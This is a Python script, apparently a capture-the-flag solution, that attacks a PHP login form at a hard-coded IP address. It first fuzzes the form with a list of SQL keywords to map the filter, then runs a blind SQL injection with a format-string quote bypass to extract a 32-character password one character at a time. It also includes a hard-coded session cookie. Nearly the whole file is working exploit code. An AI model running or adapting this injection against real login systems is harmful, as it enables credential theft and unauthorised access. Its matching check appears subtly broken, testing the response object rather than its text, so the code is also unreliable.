#!/usr/bin/env python
# coding=utf-8

# @file detect.py
# @brief detect
# @author Anemone95,x565178035@126.com
# @version 1.0
# @date 2018-10-13 15:32
import requests


def detect():
    waf_words = [ 'ord', 'or', 'union', 'select', 'and', 'from', 'order by', 'substr', "'", '*', '&&', 'information_schema', ' ', '%', 'group_concat', '(', '"', 'where', 'if', ' ', '||', '#', '--+', '_', '`', '/', '<>', 'in', '=', 'mid', 'like', 'database()', '>', 'user()', 'tables', 'limit']
    burp0_url = "http://114.55.36.69:6661/index.php"
    burp0_cookies = {"PHPSESSID": "jrspq1dsdrt8gn6tqq35mdatn0"}
    burp0_headers = {
        "Cache-Control": "max-age=0",
        "Origin": "http://114.55.36.69:6661",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Referer": "http://114.55.36.69:6661/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"}
    for each in waf_words:
        burp0_data = {"username": "admin{}".format(each), "passwd": "admin"}
        res = requests.post(
            burp0_url,
            headers=burp0_headers,
            cookies=burp0_cookies,
            data=burp0_data)
        if "illegal characters!" in res.text:
            print each


def check(payload):

    burp0_url = "http://114.55.36.69:6661/index.php"
    burp0_cookies = {"PHPSESSID": "jrspq1dsdrt8gn6tqq35mdatn0"}
    burp0_headers = {
        "Cache-Control": "max-age=0",
        "Origin": "http://114.55.36.69:6661",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Referer": "http://114.55.36.69:6661/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"}
    postdata = {'username': payload, 'passwd': 'xx'}
    r = requests.post(
        burp0_url,
        headers=burp0_headers,
        cookies=burp0_cookies,
        data=postdata)
    #print r
    return "password error!" in r


if __name__ == '__main__':
    password = ''
    for i in xrange(32):
        for j in range(45, 127):
            payload = "%1$' || id=2 && binary passwd<%1$'" + \
                password + chr(j) + "%1$'#"
            print payload
            if check(payload):
                password = password + chr(j - 1)
                break
        print password
